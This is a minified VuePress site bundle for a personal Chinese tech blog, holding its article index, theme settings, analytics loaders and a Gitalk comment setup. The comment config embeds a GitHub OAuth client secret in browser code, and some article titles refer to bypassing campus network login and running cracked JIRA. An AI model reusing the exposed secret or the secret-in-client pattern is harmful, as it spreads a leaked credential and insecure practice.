经常timedout解决办法","/pages/d3c36d/"],["11.vpn/01.科学上网/02.科学上网机场_.md","科学上网机场_","/pages/7d7af1/"],["11.vpn/01.科学上网/03.clash CFW TUN 模式.md","clash CFW TUN 模式","/pages/5f319e/"],["11.vpn/01.科学上网/04.clash tun旁路由全局代理的解决方案.md","clash tun旁路由全局代理的解决方案","/pages/5a694a/"]]},{title:"其他",collapsable:!0,children:[["11.vpn/02.其他/01.使用OpenVPN绕过校园网认证.md","使用OpenVPN绕过校园网认证","/pages/a6dfd3/"],["11.vpn/02.其他/02.openvpn搭建.md","openvpn搭建","/pages/e6840e/"],["11.vpn/02.其他/03.linux 连接 openvpn.md","linux 连接 openvpn","/pages/297499/"]]}]},{title:"安装记录",collapsable:!0,children:[["12.安装记录/01.Docker 部署 JIRA(破解版) - 三度 - 博客园.md","Docker 部署 JIRA(破解版)","/pages/81a244/"],["12.安装记录/03.docker部署nexus3.md","docker部署nexus3","/pages/206332/"],["12.安装记录/04.docker部署artifactory.md","docker部署artifactory","/pages/2519a7/"],["12.安装记录/05.Linux mysql 安装.md","Linux mysql 安装","/pages/18b7d1/"],["12.安装记录/06.Mysql 8.0 安装压缩版教程.md","Mysql 8.0 安装压缩版教程","/pages/90b705/"]]},{title:"其他",collapsable:!0,children:[["13.其他/01.edge浏览器页面强制深色模式.md","edge浏览器页面强制深色模式","/pages/291c74/"],["13.其他/02.GitHub 官方出的 Online VSCode 编辑器太香了！.md","GitHub 官方出的 Online VSCode 编辑器太香了！","/pages/c67d85/"],["13.其他/03.github图床配置.md","github图床配置","/pages/448889/"],["13.其他/04.WSL2 修改存储位置（示例：Docker-Desktop）.md","WSL2 修改存储位置（示例：Docker-Desktop）","/pages/7c24c6/"],["13.其他/05.远程桌面连接到windows账号的同一个会话.md","远程桌面连接到windows账号的同一个会话","/pages/64e3fd/"],["13.其他/06.windows 远程桌面连接 界面不一样的解决方案 如何切换会话.md","windows 远程桌面连接 界面不一样的解决方案 如何切换会话","/pages/db22b6/"]]}],"/09.教师资格证/":[{title:"结构化面试",collapsable:!0,children:[["01.结构化面试/01.结构化思维导图.md","结构化思维导图","/pages/01148f/"],["01.结构化面试/02.结构化答题.md","结构化答题","/pages/41f215/"]]},{title:"信息技术",collapsable:!0,children:[["02.信息技术/01.教案编写.md","教案编写","/pages/d6c079/"]]}],"/10.数据库/":[["01.数据库数据被非法篡改，程序如何知道.md","数据库数据被非法篡改，程序如何知道","/pages/7c7f74/"],["02.Canal实现MySQL异构数据同步.md","Canal实现MySQL异构数据同步","/pages/4a7fdc/"],["03.mysql 出现You can_t specify target table for update .md","mysql 出现You can_t specify target table for update","/pages/fbf4b4/"],["04.MySQL 日期时间加减.md","MySQL 日期时间加减","/pages/de640a/"],["05.PostgresSql 多表关联删除语句.md","PostgresSql 多表关联删除语句","/pages/d22b53/"],["06.sql排名函数 RANK，DENSE_RANK和ROW_NUMBER.md","sql排名函数 RANK，DENSE_RANK和ROW_NUMBER","/pages/f233d5/"],["07.阿里开发规范解读：为啥禁用外键约束.md","阿里开发规范解读：为啥禁用外键约束","/pages/e03ec8/"],["08.创建索引的注意事项.md","创建索引的注意事项","/pages/6a8928/"],["09.非聚集索引一定回表查询吗(覆盖索引).md","非聚集索引一定回表查询吗(覆盖索引)","/pages/f446eb/"],["10.分库分表后ID主键如何处理.md","分库分表后ID主键如何处理","/pages/ed01bf/"],["11.聚集索引与非聚集索引.md","聚集索引与非聚集索引","/pages/f17e43/"],["12.如何让系统不停机迁移到分库分表.md","如何让系统不停机迁移到分库分表","/pages/f0b5a6/"],["13.如何设计可以动态扩容的分库分表方案？.md","如何设计可以动态扩容的分库分表方案？","/pages/f04f9f/"],["14.索引类型.md","索引类型","/pages/0151c1/"],["15.MHA mysql高可用.md","MHA mysql高可用","/pages/342312/"],["16.MVCC.md","MVCC","/pages/fe79fe/"],["17.SQL执行流程.md","SQL执行流程","/pages/1fd704/"],["18.Mysql索引在什么情况下会失效？.md","Mysql索引在什么情况下会失效？","/pages/9a8ade/"],["19.mysql innoDB存储引擎 事务的提交过程.md","mysql innoDB存储引擎 事务的提交过程","/pages/dd5693/"],["20.MySQL读写分离及主从时延.md","MySQL读写分离及主从时延","/pages/57a6a5/"],["21.SQL UNION 操作符.md","SQL UNION 操作符","/pages/c7aa94/"],["22.远程登录服务器MySql数据库时出现Access denied的解决办法 - 走看看.md","远程登录服务器MySql数据库时出现Access denied的解决办法 - 走看看","/pages/25b663/"]],"/11.消息队列/":[["00.为什么要使用消息队列？.md","为什么要使用消息队列？","/pages/a135d1/"],["01.什么是幂等性.md","什么是幂等性","/pages/0a3fca/"],["02.那么如何设计接口才能做到幂等呢？.md","那么如何设计接口才能做到幂等呢？","/pages/5dde54/"],["03.如何保证消息传输不丢失？.md","如何保证消息传输不丢失？","/pages/ff9092/"],["04.如何保证消息队列的高可用？.md","如何保证消息队列的高可用？","/pages/eb292c/"],["05.消息队列百万消息积压在队列中如何处理？.md","消息队列百万消息积压在队列中如何处理？","/pages/5e7230/"],["06.消息队列如果保证消息的重复消费？（幂等性）.md","消息队列如果保证消息的重复消费？（幂等性）","/pages/fc5594/"],["07.消息队列如何保证消息的顺序性？.md","消息队列如何保证消息的顺序性？","/pages/427056/"],["08.消息中间件的应用场景.md","消息中间件的应用场景","/pages/fc28da/"],["09.消息队列的缺点.md","消息队列的缺点","/pages/1dd0a5/"],["10.MQ产品的比较.md","MQ产品的比较","/pages/a350a0/"]],"/12.微服务/":[["01.分布式服务接口请求的顺序如何保证？.md","分布式服务接口请求的顺序如何保证？","/pages/79e948/"],["02.如何设计一个高并发系统.md","如何设计一个高并发系统","/pages/cccdf5/"],["03.一致性hash算法.md","一致性hash算法","/pages/0981d9/"],["04.dubbo负载均衡策略.md","dubbo负载均衡策略","/pages/ff6bd1/"]]},author:{name:"慕溪",link:"https://github.com/chenkehao1998"},blogger:{avatar:"/img/avatar.jfif",name:"Kehao Chen",slogan:"人生如逆旅，我亦是行人"},social:{icons:[{iconClass:"icon-youjian",title:"发邮件",link:"mailto:chenkehaockh@foxmail.com"},{iconClass:"icon-github",title:"GitHub",link:"https://github.com/chenkehao1998"},{iconClass:"icon-erji",title:"听音乐",link:"https://music.163.com/#/user/home?id=39714521"}]},extendFrontmatter:{author:{name:"kehao",link:"https://github.com/chenkehao1998"}}},locales:{"/":{lang:"zh-CN",title:"慕溪",description:"人生如逆旅,我亦是行人",path:"/"}}};var El=t(94),kl=t(95),xl=t(11);var wl={computed:{$filterPosts(){return this.$site.pages.filter(n=>{const{frontmatter:{pageComponent:e,article:t,home:a}}=n;return!(e||!1===t||!0===a)})},$sortPosts(){return(n=this.$filterPosts).sort((n,e)=>{const t=n.frontmatter.sticky,a=e.frontmatter.sticky;return t&&a?t==a?Object(xl.a)(n,e):t-a:t&&!a?-1:!t&&a?1:Object(xl.a)(n,e)}),n;var n},$sortPostsByDate(){return(n=this.$filterPosts).sort((n,e)=>Object(xl.a)(n,e)),n;var n},$groupPosts(){return function(n){const e={},t={};for(let a=0,r=n.length;a<r;a++){const{frontmatter:{categories:r,tags:i}}=n[a];"array"===Object(xl.n)(r)&&r.forEach(t=>{t&&(e[t]||(e[t]=[]),e[t].push(n[a]))}),"array"===Object(xl.n)(i)&&i.forEach(e=>{e&&(t[e]||(t[e]=[]),t[e].push(n[a]))})}return{categories:e,tags:t}}(this.$sortPosts)},$categoriesAndTags(){return function(n){const e=[],t=[];for(let t in n.categories)e.push({key:t,length:n.categories[t].length});for(let e in n.tags)t.push({key:e,length:n.tags[e].length});return{categories:e,tags:t}}(this.$groupPosts)}}};Vt.component(El.default),Vt.component(kl.default);function Bl(n){return n.toString().padStart(2,"0")}t(237);Vt.component("Badge",()=>Promise.all([t.e(0),t.e(58)]).then(t.bind(null,1012))),Vt.component("CodeBlock",()=>Promise.resolve().then(t.bind(null,94))),Vt.component("CodeGroup",()=>Promise.resolve().then(t.bind(null,95)));t(238),t(239);var Al=t(93),Cl=t.n(Al),Sl=t(25);let jl,Tl;var Pl;"valine"===(Pl="gitalk")?t.e(300).then(t.t.bind(null,714,7)).then(n=>Tl=n.default):"gitalk"===Pl&&Promise.all([t.e(0),t.e(299)]).then(t.t.bind(null,715,7)).then(()=>t.e(298).then(t.t.bind(null,716,7))).then(n=>jl=n.default);function _l(n,e){const t={};return Reflect.ownKeys(n).forEach(a=>{if("string"==typeof n[a])try{t[a]=Cl.a.render(n[a],e)}catch(e){console.warn(`Comment config option error at key named "${a}"`),console.warn("More info: "+e.message),t[a]=n[a]}else t[a]=n[a]}),t}console.log(`How to use "gitalk" in ${Sl.name}@v${Sl.version}:`,Sl.homepage);const Il={gitalk:{render(n,e){const t=document.createElement("div");t.id=e;document.querySelector("main.page").appendChild(t);new jl(_l({clientID:"18e915ee9179600f60bf",clientSecret:"017d59946811035b491b4ba3492a3d5b7dd17d1b",repo:"blog-gitalk-comment",owner:"chenkehao1998",admin:["chenkehao1998"],distractionFreeMode:!1,pagerDirection:"last",id:"<%- (frontmatter.permalink || frontmatter.to.path).slice(-16) %>",title:"「评论」<%- frontmatter.title %>",labels:["Gitalk","Comment"],body:"页面：<%- window.location.origin + (frontmatter.to.path || window.location.pathname) %>"},{frontmatter:n})).render(e)},clear(n){const e=document.querySelector("#"+n);return e&&e.remove(),!0}},valine:{render(n,e){const t=document.createElement("div");t.id=e;document.querySelector("main.page").appendChild(t),new Tl({..._l({clientID:"18e915ee9179600f60bf",clientSecret:"017d59946811035b491b4ba3492a3d5b7dd17d1b",repo:"blog-gitalk-comment",owner:"chenkehao1998",admin:["chenkehao1998"],distractionFreeMode:!1,pagerDirection:"last",id:"<%- (frontmatter.permalink || frontmatter.to.path).slice(-16) %>",title:"「评论」<%- frontmatter.title %>",labels:["Gitalk","Comment"],body:"页面：<%- window.location.origin + (frontmatter.to.path || window.location.pathname) %>"},{frontmatter:n}),el:"#"+e})},clear(n){const e=document.querySelector("#"+n);return e&&e.remove(),!0}}},zl="vuepress-plugin-comment";let Dl=null;function Ll(n){return Il.gitalk.clear(zl)}function Ol(n){return!1!==n.comment&&!1!==n.comments}function Fl(n){clearTimeout(Dl);if(document.querySelector("main.page"))return Il.gitalk.render(n,zl);Dl=setTimeout(()=>Fl(n),200)}var Ml={mounted(){Dl=setTimeout(()=>{const n={to:{},from:{},...this.$frontmatter};Ll()&&Ol(n)&&Fl(n)},1e3),this.$router.afterEach((n,e)=>{if(n&&e&&n.path===e.path)return;const t={to:n,from:e,...this.$frontmatter};Ll()&&Ol(t)&&Fl(t)})}},Rl=Object(fl.a)(Ml,(function(){return(0,this._self._c)("div")}),[],!1,null,null,null).exports,Ul=[({Vue:n,options:e,router:t,siteData:a})=>{},({Vue:n,options:e,router:t,siteData:a})=>{a.pages.map(n=>{const{frontmatter:{date:e,author:t}}=n;"string"==typeof e&&"Z"===e.charAt(e.length-1)&&(n.frontmatter.date=function(n){n instanceof Date||(n=new Date(n));return`${n.getUTCFullYear()}-${Bl(n.getUTCMonth()+1)}-${Bl(n.getUTCDate())} ${Bl(n.getUTCHours())}:${Bl(n.getUTCMinutes())}:${Bl(n.getUTCSeconds())}`}(e)),t?n.author=t:a.themeConfig.author&&(n.author=a.themeConfig.author)}),n.mixin(wl)},{},({Vue:n})=>{n.mixin({computed:{$dataBlock(){return this.$options.__data__block__}}})},{},{},({router:n})=>{"undefined"!=typeof window&&function(){var n=document.createElement("script"),e=window.location.protocol.split(":")[0];n.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(n,t)}()},({router:n})=>{"undefined"!=typeof window&&(window._hmt=window._hmt||[],function(){var n=document.createElement("script");n.src="https://hm.baidu.com/hm.js?503f098e7e5b3a5b5d8c5fc2938af002";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)}(),n.afterEach((function(n){_hmt.push(["_trackPageview",n.fullPath])})))},({Vue:n})=>{n.component("Comment",Rl)}],ql=["Comment"];class Nl extends class{constructor(){this.store=new Vt({data:{state:{}}})}$get(n){return this.store.state[n]}$set(n,e){Vt.set(this.store.state,n,e)}$emit(...n){this.store.$emit(...n)}$on(...n){this.store.$on(...n)}}{}Object.assign(Nl.prototype,{getPageAsyncComponent:is,getLayoutAsyncComponent:os,getAsyncComponent:ss,getVueComponent:ls});var $l={install(n){const e=new Nl;n.$vuepress=e,n.prototype.$vuepress=e}};function Hl(n,e){const t=e.toLowerCase();return n.options.routes.some(n=>n.path.toLowerCase()===t)}var Vl={props:{pageKey:String,slotKey:{type:String,default:"default"}},render(n){const e=this.pageKey||this.$parent.$page.key;return ps("pageKey",e),Vt.component(e)||Vt.component(e,is(e)),Vt.component(e)?n(e):n("")}},Jl={functional:!0,props:{slotKey:String,required:!0},render:(n,{props:e,slots:t})=>n("div",{class:["content__"+e.slotKey]},t()[e.slotKey])},Wl={computed:{openInNewWindowTitle(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},Ql=(t(245),t(246),Object(fl.a)(Wl,(function(){var n=this._self._c;return n("span",[n("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[n("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),n("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),n("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports),Zl={functional:!0,render(n,{parent:e,children:t}){if(e._isMounted)return t;e.$once("hook:mounted",()=>{e.$forceUpdate()})}};Vt.config.productionTip=!1,Vt.use(Ho),Vt.use($l),Vt.mixin(function(n,e,t=Vt){!function(n){n.locales&&Object.keys(n.locales).forEach(e=>{n.locales[e].path=e});Object.freeze(n)}(e),t.$vuepress.$set("siteData",e);const a=new(n(t.$vuepress.$get("siteData"))),r=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(a)),i={};return Object.keys(r).reduce((n,e)=>(e.startsWith("$")&&(n[e]=r[e].get),n),i),{computed:i}}(n=>class{setPage(n){this.__page=n}get $site(){return n}get $themeConfig(){return this.$site.themeConfig}get $frontmatter(){return this.$page.frontmatter}get $localeConfig(){const{locales:n={}}=this.$site;let e,t;for(const a in n)"/"===a?t=n[a]:0===this.$page.path.indexOf(a)&&(e=n[a]);return e||t||{}}get $siteTitle(){return this.$localeConfig.title||this.$site.title||""}get $canonicalUrl(){const{canonicalUrl:n}=this.$page.frontmatter;return"string"==typeof n&&n}get $title(){const n=this.$page,{metaTitle:e}=this.$page.frontmatter;if("string"==typeof e)return e;const t=this.$siteTitle,a=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?a?a+" | "+t:t:a||"VuePress"}get $description(){const n=function(n){if(n){const e=n.filter(n=>"description"===n.name)[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}get $lang(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}get $localePath(){return this.$localeConfig.path||"/"}get $themeLocaleConfig(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}get $page(){return this.__page?this.__page:function(n,e){for(let t=0;t<n.length;t++){const a=n[t];if(a.path.toLowerCase()===e.toLowerCase())return a}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}},yl)),Vt.component("Content",Vl),Vt.component("ContentSlotsDistributor",Jl),Vt.component("OutboundLink",Ql),Vt.component("ClientOnly",Zl),Vt.component("Layout",os("Layout")),Vt.component("NotFound",os("NotFound")),Vt.prototype.$withBase=function(n){const e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.5",hash:"7f9f9ad"},async function(n){const e="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:yl.routerBase||yl.base,t=new Ho({base:e,mode:"history",fallback:!1,routes:vl,scrollBehavior:(n,e,t)=>t||(n.hash?!Vt.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})});!function(n){n.beforeEach((e,t,a)=>{if(Hl(n,e.path))a();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){const t=e.path.replace(/\/$/,"")+".html";Hl(n,t)?a(t):a()}else a();else{const t=e.path+"/",r=e.path+".html";Hl(n,r)?a(r):Hl(n,t)?a(t):a()}})}(t);const a={};try{await Promise.all(Ul.filter(n=>"function"==typeof n).map(e=>e({Vue:Vt,options:a,router:t,siteData:yl,isServer:n})))}catch(n){console.error(n)}return{app:new Vt(Object.assign(a,{router:t,render:n=>n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},ql.map(e=>n(e)))])})),router:t}}(!1).then(({app:n,router:e})=>{e.onReady(()=>{n.$mount("#app")})})}]);